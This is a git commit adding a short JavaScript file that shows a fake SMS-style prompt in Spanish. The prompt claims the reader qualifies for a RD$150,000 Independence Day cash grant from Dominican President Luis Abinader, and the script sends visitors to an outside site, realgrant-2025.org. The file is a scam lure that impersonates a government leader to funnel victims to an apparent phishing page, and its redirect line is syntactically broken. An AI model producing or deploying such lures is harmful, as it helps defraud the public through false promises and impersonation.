91e3acbce4f1cc39a7146a18f0bd37a9b3983810
Sweetblogboi <nsiboy760@gmail.com>
2025-02-18 07:52:33 +0100

    Create dominican-active.js

---
+++ dominican-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APLICAR AHORA'
+password=prompt('SMS: Felicitaciones, usted califica para la SUBVENCIÓN EN EFECTIVO PARA LA CELEBRACIÓN DEL DÍA DE LA INDEPENDENCIA DE RD$150,000 del Presidente LUIS ABINADER. Por favor presione OK para recibir el regalo ahora.   ','APLICAR AHORA');
+if (password != 'APLICAR AHORA') {
+location.href='https://realgrant-2025.org/dominican.html;
+}
